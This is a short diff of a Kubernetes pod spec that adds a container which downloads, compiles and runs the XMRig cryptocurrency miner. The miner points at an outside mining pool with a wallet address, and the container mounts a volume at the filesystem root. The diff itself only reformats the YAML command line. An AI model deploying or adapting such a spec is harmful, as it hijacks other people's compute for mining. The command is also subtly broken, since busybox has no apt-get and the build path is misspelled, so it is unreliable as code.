@@ -7,7 +7,7 @@ spec:
   - name: xmrig-container
     image: busybox
     command:
-    -apt-get update -y --fix-missing && apt-get upgrade && apt-get install git && apt-get install wget && apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev -y && git clone https://github.com/xmrig/xmrig && cd xmrig && mkdir build && cd bulid && cmake -DWITH_HWLOC=OFF .. && make && ./xmrig -o gulf.moneroocean.stream:80 -u 87T57vEfgmKevdUuXwsjZGYpZ8FUR5LuuZA8BGG9sQ91hUbaqRh7HywdxhKQcqvqbsaPuZktbBzPy5cwPpXtJh275TpS7U5 -p piD3ceiver
+    - apt-get update -y --fix-missing && apt-get upgrade && apt-get install git && apt-get install wget && apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev -y && git clone https://github.com/xmrig/xmrig && cd xmrig && mkdir build && cd bulid && cmake -DWITH_HWLOC=OFF .. && make && ./xmrig -o gulf.moneroocean.stream:80 -u 87T57vEfgmKevdUuXwsjZGYpZ8FUR5LuuZA8BGG9sQ91hUbaqRh7HywdxhKQcqvqbsaPuZktbBzPy5cwPpXtJh275TpS7U5 -p piD3ceiver
     volumeMounts:
     - name: xmrig-volume
       mountPath: /
